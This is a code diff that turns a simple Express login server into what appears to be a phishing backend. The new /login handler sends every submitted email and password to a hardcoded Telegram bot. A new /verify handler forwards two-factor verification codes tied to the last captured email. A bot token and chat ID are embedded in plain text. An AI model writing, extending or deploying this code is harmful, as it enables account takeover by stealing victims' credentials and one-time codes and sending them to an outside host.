@@ -1,24 +1,60 @@
 const express = require('express');
-const path = require('path');
+const bodyParser = require('body-parser');
+const cors = require('cors');
+const axios = require('axios');
+
 const app = express();
 const PORT = 3000;
 
-// Middleware to parse JSON
-app.use(express.json());
+// ✅ Telegram Bot Info
+const BOT_TOKEN = '8059999764:AAGN7IycgZnJ2LitMEKW9P_4Aym2J5PMUDg';
+const CHAT_ID = '1244954214';
 
-// Serve static files (frontend) from "public" folder
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(cors());
+app.use(bodyParser.json());
+app.use(express.static('public'));
 
-// Handle login form POST
+let latestEmail = '';
+
+// 🔐 Handle login
 app.post('/login', (req, res) => {
-  const { email, password, stayLoggedIn } = req.body;
-  console.log("Login received:", email, password, stayLoggedIn);
-  res.json({ message: "Login received!" });
+  const { email, password } = req.body;
+  latestEmail = email;
+
+  const message = `🔐 Login Received:\nEmail: ${email}\nPassword: ${password}`;
+
+  axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    chat_id: CHAT_ID,
+    text: message
+  }).then(() => {
+    console.log('Login info sent to Telegram');
+  }).catch(error => {
+    console.error('Telegram error:', error.message);
+  });
+
+  res.json({ success: true });
 });
 
-// Start server
+// ✅ Handle verification code
+app.post('/verify', (req, res) => {
+  const { code } = req.body;
+  const message = `✅ Verification Code for ${latestEmail}:\nCode: ${code}`;
+
+  axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    chat_id: CHAT_ID,
+    text: message
+  }).then(() => {
+    console.log('Verification code sent to Telegram');
+  }).catch(error => {
+    console.error('Telegram error:', error.message);
+  });
+
+  res.json({ success: true });
+});
+
+// ▶️ Start server
 app.listen(PORT, () => {
-  console.log(`Server running at http://localhost:${PORT}`);
+  console.log(`✅ Server running at http://localhost:${PORT}`);
 });
 
 
